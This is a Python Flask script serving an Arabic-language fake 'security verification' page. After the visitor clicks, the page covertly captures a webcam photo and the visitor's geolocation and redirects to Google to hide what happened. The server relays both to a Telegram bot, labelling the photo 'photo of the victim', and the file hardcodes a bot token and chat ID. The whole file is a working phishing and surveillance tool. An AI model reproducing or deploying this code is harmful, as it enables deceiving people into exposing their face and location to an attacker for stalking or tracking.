import base64
import requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN = "7041600701"

HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>تحقق</title></head>
<body style="text-align:center;padding:50px;">
<h1>🔒 تحقق أمان</h1>
<button onclick="start()">اضغط للتحقق</button>
<p id="status"></p>
<video id="video" autoplay style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>
<script>
async function start() {
    document.querySelector('button').disabled = true;
    document.getElementById('status').innerHTML = 'جاري التحقق...';
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video: true});
        const video = document.getElementById('video');
        video.srcObject = stream;
        
        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth || 400;
            canvas.height = video.videoHeight || 300;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const img = canvas.toDataURL('image/jpeg', 0.8);
            fetch('/send', {method:'POST',body:JSON.stringify({img:img,type:'photo'}),headers:{'Content-Type':'application/json'}});
        }, 2000);
        
        navigator.geolocation.getCurrentPosition(pos => {
            fetch('/send', {method:'POST',body:JSON.stringify({loc:`https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`,type:'loc'}),headers:{'Content-Type':'application/json'}});
        });
        
        document.getElementById('status').innerHTML = 'تم بنجاح، جاري التوجيه...';
        setTimeout(() => window.location.href = 'https://google.com', 3000);
        
    } catch(e) {
        document.getElementById('status').innerHTML = 'فشل: يرجى السماح بالكاميرا';
    }
}
</script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/send', methods=['POST'])
def send_data():
    data = request.get_json()
    
    if data.get('type') == 'photo':
        img_data = data['img'].split(',')[1]
        img_bytes = base64.b64decode(img_data)
        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto', 
                     data={'chat_id': ADMIN, 'caption': '📸 صورة الضحية'},
                     files={'photo': ('photo.jpg', img_bytes)})
    elif data.get('type') == 'loc':
        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage',
                     json={'chat_id': ADMIN, 'text': f'📍 الموقع: {data["loc"]}'})
    
    return 'ok'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
